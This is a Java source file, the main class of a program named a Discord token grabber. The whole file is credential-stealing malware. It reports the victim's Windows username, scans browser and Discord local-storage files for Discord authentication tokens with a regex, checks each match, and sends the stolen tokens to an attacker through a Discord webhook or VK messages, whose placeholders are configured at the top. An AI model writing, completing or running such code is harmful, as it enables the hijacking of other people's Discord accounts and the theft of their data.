package com.github.dedinc.discordtokengrabber;

import com.github.dedinc.discordtokengrabber.utils.Helper;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.io.BufferedReader;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    public final static boolean vk = false; //If need send to VK set true
    public final static String token = "VK TOKEN";
    public final static int receiver = 1337; //VK ID to send logs
    public final static String webHook = "DISCORD HOOK";
    public static ArrayList<String> tokens = new ArrayList<String>();

    public static void main (String[] args) {
        Helper.getSender().sendMessage("[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + System.getenv("USERNAME"));
        for (String path : Helper.getManager().getPaths()) {
            if (path.contains("Firefox")) {
                getTokens(path, true);
            } else {
                getTokens(path, false);
            }
        }
        if (tokens.size() == 0) {
            Helper.getSender().sendMessage("Tokens not found :(");
        }
    }

    public static void getTokens(String path, boolean firefox) {
        try {
            Path spath = Paths.get(path);
            if (!firefox) {
                spath = Paths.get(path, "Local Storage", "leveldb");
            }
            Files.list(spath)
                    .limit(100)
                    .forEach(file -> {
                        final String fname = file.toFile().getName();
                        if (fname.endsWith(".log") || fname.endsWith(".ldb") || fname.endsWith(".sqlite")) {
                            try {
                                try (BufferedReader br = new BufferedReader(new FileReader(file.toFile()))) {
                                    String line;
                                    while ((line = br.readLine()) != null) {
                                        Pattern p = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
                                        Matcher m = p.matcher(line);
                                        while (m.find()) {
                                            Long.parseLong(new String(Base64.decode(m.group().split("\\.")[0]), StandardCharsets.UTF_8));
                                            if (!tokens.contains(m.group())) {
                                                tokens.add(m.group());
                                                Helper.getSender().sendMessage(Helper.geChecker().checkUser(m.group()));
                                            }
                                        }
                                    }
                                }
                            } catch (Exception e) {e.printStackTrace();}
                        }
                    });
        } catch (Exception e) {}
    }
}
